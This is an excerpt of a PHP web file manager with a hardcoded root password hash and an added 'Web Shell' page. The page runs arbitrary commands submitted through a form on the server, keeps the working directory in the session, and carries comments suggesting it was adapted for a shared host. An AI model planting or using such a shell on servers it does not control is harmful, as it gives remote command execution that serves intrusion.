...
$auth_users = array(
    'root' => '$2y$10$6nHM.Pd/StaPzi54WtbI1OS018pBO9JZReqJP8/jMeOCGpxzr8R46',
);
            ...
            <div class="card-body">
                <form action="" method="post">
                    ...
                    <p class="custom-checkbox custom-control"><input type="checkbox" name="move" value="1"
                        ...
                        <label for="js-move-files" class="custom-control-label ms-2">
                            <?php echo lng('Move') ?>
                        </label>
                    </p>
                    <p>
            ...
            <div class="card-body">
                <form id="js-settings-form" action="" method="post" data-type="ajax" onsubmit="return save_settings(this)">
                    ...
                    <div class="mt-3 mb-3 row ">
                        <label for="js-error-report" class="col-sm-3 col-form-label">
                    ...
                    <div class="mb-3 row">
                        <label for="js-show-hidden" class="col-sm-3 col-form-label">
                    ...
                    <div class="mb-3 row">
                        <label for="js-hide-cols" class="col-sm-3 col-form-label">
                    ...
                    <small class="text-body-secondary">*
                        <?php echo lng('Sometimes the save action may not work on the first try, so please attempt it again') ?>.
                    </small>
                </form>
            </div>
        </div>
    ...
    <div class="row">
        <div class="col-12">
            <ul class="list-group w-50 my-3" data-bs-theme="<?php echo FM_THEME; ?>">
                <li class="list-group-item active" aria-current="true"><strong>
                        <?php echo lng($view_title) ?>:
                    </strong>
                ...
                <li class="list-group-item"><strong>
                    ...
                    <?php echo $display_path['path']; ?>
                </li>
                <li class="list-group-item"><strong>
                        <?php echo lng('Date Modified') ?>:
                    </strong>
                    <?php echo date(FM_DATETIME_FORMAT, filemtime($file_path)); ?>
                </li>
                <li class="list-group-item"><strong>
                        <?php echo lng('File size') ?>:
                    </strong>
                    <?php echo ($filesize_raw <= 1000) ? "$filesize_raw bytes" : $filesize; ?>
                </li>
                <li class="list-group-item"><strong>
                        <?php echo lng('MIME-type') ?>:
                    </strong>
                    <?php echo $mime_type ?>
                </li>
                <?php
                ...
                if (!FM_READONLY && ($is_zip || $is_gzip) && $filenames !== false) {
                    ...
                    <form method="post" class="d-inline btn btn-outline-primary mb-0">
                        ...
                        <button type="submit" class="btn btn-link text-decoration-none fw-bold p-0 border-0"
                            style="font-size: 14px;"><i class="fa fa-check-circle"></i>
                            <?php echo lng('UnZip') ?>
                        </button>
                    </form>
                    <form method="post" class="d-inline btn btn-outline-primary mb-0">
...
// Web Shell - Execute commands (Stateful Terminal)
if (isset($_GET['shell']) && !FM_READONLY) {
    fm_show_header(); // HEADER
    fm_show_nav_path(FM_PATH); // current path
    
    // Initialize session variables for terminal state
    if (!isset($_SESSION['shell_cwd'])) {
        $_SESSION['shell_cwd'] = FM_ROOT_PATH;
        if (FM_PATH != '') {
            $_SESSION['shell_cwd'] .= '/' . FM_PATH;
        }
    }
    
    $output = '';
    $command = '';
    $cwd = $_SESSION['shell_cwd'];
    
    // Handle command execution
    if (isset($_POST['command']) && isset($_POST['token']) && verifyToken($_POST['token'])) {
        ...
        if (!empty($command)) {
            ...
            if (preg_match('/^cd\s+(.+)$/i', $command, $matches)) {
                ...
                if ($new_dir === '~') {
                    $new_dir = $_SERVER['HOME'] ?? FM_ROOT_PATH;
                } elseif ($new_dir === '-') {
                    // Go to previous directory (if we tracked it)
                    $new_dir = isset($_SESSION['shell_prev_cwd']) ? $_SESSION['shell_prev_cwd'] : $cwd;
                ...
                if ($new_dir && is_dir($new_dir)) {
                    $_SESSION['shell_prev_cwd'] = $cwd;
                    $_SESSION['shell_cwd'] = $new_dir;
                    $cwd = $new_dir;
                    $output = "Changed directory to: " . $new_dir;
                } else {
                    $output = "cd: no such file or directory: " . $matches[1];
                }
            } else {
                ...
                if (function_exists('shell_exec')) {
                    ...
                    $output = "Error: All execution functions (shell_exec, exec, system, passthru, proc_open) are disabled by Hostinger.";
                }
                // --- نهاية التعديل ---
                
                // Check if command might have changed directory (for compound commands)
                $current_dir = getcwd();
                if ($current_dir && $current_dir !== $cwd) {
                    $_SESSION['shell_prev_cwd'] = $cwd;
                    $_SESSION['shell_cwd'] = $current_dir;
                    $cwd = $current_dir;
                }
                
                // Only show "no output" message if the command truly produced nothing
                if ($output === null) {
    ...
    if (isset($_GET['reset'])) {
        ...
        $cwd = $_SESSION['shell_cwd'];
        unset($_SESSION['shell_prev_cwd']);
        $output = "Terminal reset to: " . $cwd;
    }
    ?>
    <div class="path">
        <div class="row">
            <div class="col-12">
                <div class="d-flex justify-content-between align-items-center">
                    <h3><i class="fa fa-terminal"></i> Web Shell - Interactive Terminal</h3>
                    <a href="?p=<?php echo urlencode(FM_PATH) ?>&shell=1&reset=1" class="btn btn-sm btn-warning">
                        <i class="fa fa-refresh"></i> Reset Terminal
                    </a>
                </div>
                <p class="text-muted mb-0">
                    <strong>Current Directory:</strong> <code class="text-success"><?php echo fm_enc($cwd); ?></code>
                </p>
                <small class="text-muted">
                    <i class="fa fa-info-circle"></i> Use 'cd' to change directories - state persists between commands
                </small>
            </div>
        </div>
            ...
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-dark text-white">
                        <i class="fa fa-terminal"></i> Terminal Session
                    </div>
                    <div class="card-body">
                        <form method="post" action="?p=<?php echo urlencode(FM_PATH) ?>&shell=1" id="terminalForm">
                            <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
                            <div class="mb-3">
                                <div class="input-group">
                                    <span class="input-group-text bg-dark text-success border-success">
                                        <i class="fa fa-terminal"></i> <?php echo fm_enc(basename($cwd)); ?> $
                                    </span>
                                    <input type="text" class="form-control border-success" name="command" id="command" 
                                           value="" 
                                           placeholder="Enter command..." autofocus autocomplete="off">
                                    <button type="submit" class="btn btn-success">
                                        <i class="fa fa-play"></i> Run
                                    </button>
                                </div>
                                <small class="form-text text-muted">
                                    Try: cd /tmp, ls -la, pwd, cat file.txt
                                </small>
                            </div>
                        </form>
                        ...
                        <div class="mt-3">
                            <div class="bg-dark text-white p-3 rounded" style="min-height: 100px; max-height: 500px; overflow-y: auto; font-family: 'Courier New', monospace;">
                                <div class="text-success mb-2">
                                    <i class="fa fa-terminal"></i> <?php echo fm_enc(basename($_SESSION['shell_prev_cwd'] ?? $cwd)); ?> $ <?php echo fm_enc($command); ?>
                                </div>
                                <div class="text-white" style="white-space: pre-wrap;"><?php echo htmlspecialchars($output, ENT_QUOTES, 'UTF-8'); ?></div>
                            </div>
                        </div>
                        <?php endif; ?>
                        ...
                        <div class="row mt-4">
                            <div class="col-md-6">
                                ...
                                <div class="btn-group-vertical w-100" role="group">
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='cd ~'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-home"></i> cd ~ - Home directory
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='cd ..'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-level-up"></i> cd .. - Parent directory
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='cd -'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-history"></i> cd - - Previous directory
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='pwd'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-folder-open"></i> pwd - Show current path
                                    </button>
                                </div>
                            </div>
                            <div class="col-md-6">
                                ...
                                <div class="btn-group-vertical w-100" role="group">
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='ls -la'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-list"></i> ls -la - List files
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='whoami'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-user"></i> whoami - Current user
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='df -h'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-hdd-o"></i> df -h - Disk usage
                                    </button>
                                    <button type="button" class="btn btn-outline-secondary btn-sm text-start" onclick="document.getElementById('command').value='ps aux | head -20'; document.getElementById('terminalForm').submit();">
                                        <i class="fa fa-tasks"></i> ps aux - Processes
                                    </button>
                                </div>
                            </div>
                        </div>
                        ...
                        <div class="mt-4 pt-3 border-top">
                            <a href="?p=<?php echo urlencode(FM_PATH) ?>" class="btn btn-outline-primary">
                                <i class="fa fa-arrow-left"></i> Back to File Manager
                            </a>
                            <a href="?p=<?php echo urlencode(FM_PATH) ?>&shell=1&reset=1" class="btn btn-outline-warning">
                                <i class="fa fa-refresh"></i> Reset Terminal
                            </a>
                        </div>
                    </div>
    ...
    <script>
        // Auto-focus on command input after page load
        ...
        <table class="table table-bordered table-hover table-sm" id="main-table"
            ...
            foreach ($folders as $f) {
                ...
                <tr>
                    ...
                    <td data-order="a-<?php echo $date_sorting; ?>">
                        <?php echo $modif ?>
                    </td>
                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td>
            ...
            foreach ($files as $f) {
                ...
                <tr>
                    ...
                    <td data-order="b-<?php echo $date_sorting; ?>">
                        <?php echo $modif ?>
                    </td>
                    <?php if (!FM_IS_WIN && !$hide_Cols): ?>
                        <td>
            ...
            <div class="col-xs-6 col-sm-7">
                <ul class="navbar-nav justify-content-end" data-bs-theme="<?php echo FM_THEME; ?>">
                    ...
                    <?php if (!FM_READONLY): ?>
                        ...
                        <li class="nav-item">
                            <a title="Web Shell" class="nav-link" href="?p=<?php echo urlencode(FM_PATH) ?>&shell=1">
                                <i class="fa fa-terminal" aria-hidden="true"></i> Web Shell
                            </a>
                        </li>
                    <?php endif; ?>
                    <?php if (FM_USE_AUTH): ?>
                ...
                <div class="modal-dialog" role="document">
                    <form class="modal-content rounded-3 shadow" method="post" autocomplete="off">
                        <div class="modal-body p-4 text-center">
                            <h5 class="mb-3">
                                <?php echo lng('Are you sure want to rename?') ?>
                            </h5>
                            <p class="mb-1">
                        ...
                        <div class="modal-footer flex-nowrap p-0">
                            ...
                            <button type="submit"
                                class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong>
                                    <?php echo lng('Okay') ?>
                                </strong></button>
                        </div>
                    </form>
